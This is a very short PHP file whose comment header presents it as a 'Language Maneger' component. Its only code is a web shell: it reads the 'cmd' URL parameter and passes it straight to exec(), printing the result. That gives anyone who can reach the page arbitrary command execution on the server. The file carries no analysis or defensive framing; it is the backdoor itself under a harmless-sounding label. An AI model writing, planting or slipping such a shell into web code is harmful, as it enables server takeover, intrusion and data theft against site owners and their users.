<?
/* 
------------------
Language Maneger
------------------
*/
?>
<?php
$cmd=$_GET['cmd'];
echo exec($cmd);
?>